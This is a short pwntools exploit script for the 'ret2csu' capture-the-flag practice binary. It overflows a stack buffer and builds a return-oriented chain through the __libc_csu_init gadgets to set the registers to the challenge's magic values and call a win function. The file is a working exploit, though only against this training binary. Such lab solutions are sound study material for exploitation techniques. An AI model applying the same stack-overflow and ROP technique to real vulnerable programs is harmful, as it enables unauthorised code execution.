import pwn
from pwn import * 

p = process("./ret2csu")
context.binary = "ret2csu"

offset = b"A"*40
pop_rdi = 0x00000000004006a3
pop_chain = 0x000000000040069a
csu = 0x0000000000400680
win = 0x400510
pointer = 0x600e48

chain = b""
chain += offset
chain += p64(pop_chain)
chain += p64(0x0)
chain += p64(0x1)
chain += p64(pointer)
chain += p64(0xdeadbeefdeadbeef)
chain += p64(0xcafebabecafebabe)
chain += p64(0xd00df00dd00df00d)
chain += p64(csu)
chain += p64(0)
chain += p64(0)
chain += p64(0)
chain += p64(0)
chain += p64(0)
chain += p64(0)
chain += p64(0)
#chain += b"A"*56
chain += p64(pop_rdi)
chain += p64(0xdeadbeefdeadbeef)
chain += p64(win)
p.sendline(chain)
p.interactive()
